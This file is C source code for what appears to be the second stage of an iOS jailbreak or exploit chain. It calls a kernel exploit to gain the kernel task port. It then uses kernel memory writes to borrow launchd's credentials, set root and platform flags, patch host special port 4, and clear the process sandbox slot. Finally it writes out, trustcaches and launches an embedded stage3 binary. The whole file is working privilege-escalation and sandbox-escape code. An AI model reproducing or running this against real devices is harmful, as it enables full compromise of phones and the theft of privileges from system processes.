#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include "common.h"
#include "time_saved/time_saved.h"
#include <asl.h>
#include <CoreFoundation/CoreFoundation.h>
#include <CommonCrypto/CommonDigest.h>
#include <sys/stat.h>
#include <mach-o/loader.h>
#include <mach-o/fat.h>
#include <spawn.h>
#include "stage3.h"
#include "trustcache.h"
#include "hsp4.h"
#include "kutils.h"

char stage3_path[1024];

extern mach_port_t tfpzero;
extern uint64_t kernel_slide;

extern uint64_t self_struct_proc;
extern uint64_t kern_struct_proc;
extern uint64_t launchd_struct_proc;

int launch_stage3(char *binary, char *arg1, char *arg2, char *arg3, char *arg4, char *arg5, char *arg6, char**env) {
    pid_t pd;
    const char* args[] = {binary, arg1, arg2, arg3, arg4, arg5, arg6,  NULL};
    
    int rv = posix_spawn(&pd, binary, NULL, NULL, (char **)&args, env);

    uint64_t spawnedProc = proc_of_pid(pd);

    //borrow launchd ucred
    uint64_t launchd_ucred = rk64(launchd_struct_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
    uint64_t spawned_ucred = rk64(spawnedProc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
    wk64(spawnedProc + koffset(KSTRUCT_OFFSET_PROC_UCRED), launchd_ucred);

    while (access("/tmp/stage3_got_hsp4", F_OK) != 0) {};

    //restore
    wk64(spawnedProc + koffset(KSTRUCT_OFFSET_PROC_UCRED), spawned_ucred);

    if (rv) return rv;
    
    return 0;
}

int extract_stage3(void) {
  memset(stage3_path, 0, 1024);
  strcpy(stage3_path, "/var/containers/Bundle/stage3");
  remove(stage3_path);

  FILE *f = fopen(stage3_path, "wb");

  size_t total_size = sizeof(stage3);
  fwrite(stage3, 1, total_size, f);

  fclose(f);
  asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] Wrote stage3 (%zu bytes), stage3_path = %s", total_size, stage3_path);

  return 0;
}

int main() {
  asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] loaded");

  int tfpzero = start_time_saved();
  asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] tfp0 = 0x%x, kslide: 0x%llx, kern_struct_task: 0x%llx", tfpzero, kernel_slide, kern_struct_task);

  //platformize
  set_csflags(self_struct_proc);
  set_tfplatform(self_struct_proc);

  //borrow launchd ucred
  uint64_t launchd_ucred = rk64(launchd_struct_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
  uint64_t self_ucred = rk64(self_struct_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
  wk64(self_struct_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED), launchd_ucred);

  //elevate
  setuid(0);
  setuid(0);

  //hsp4 patch
  setHSP4();
  // mach_port_t hsp4 = MACH_PORT_NULL;
  // host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &hsp4);
  // asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] hsp4 = 0x%x", hsp4);

  //prepare stage3
  extract_stage3();
  int ret = trustbin(stage3_path);
  asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] trustbin ret = 0x%x", ret);
  chmod(stage3_path, 0755);
  
  //restore ucred
  wk64(self_struct_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED), self_ucred);

  //unsandbox
  uint64_t saved_sb = rk64(rk64(self_ucred+koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL)) + koffset(KSTRUCT_OFFSET_SANDBOX_SLOT));
  wk64(rk64(self_ucred+koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL)) + koffset(KSTRUCT_OFFSET_SANDBOX_SLOT), 0);

  launch_stage3(stage3_path, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

  //restore sandbox
  wk64(rk64(self_ucred+koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL)) + koffset(KSTRUCT_OFFSET_SANDBOX_SLOT), saved_sb);

  sleep(3);

  return 0;
}

uint64_t entry[] = { MAGIC, (uint64_t)&main };
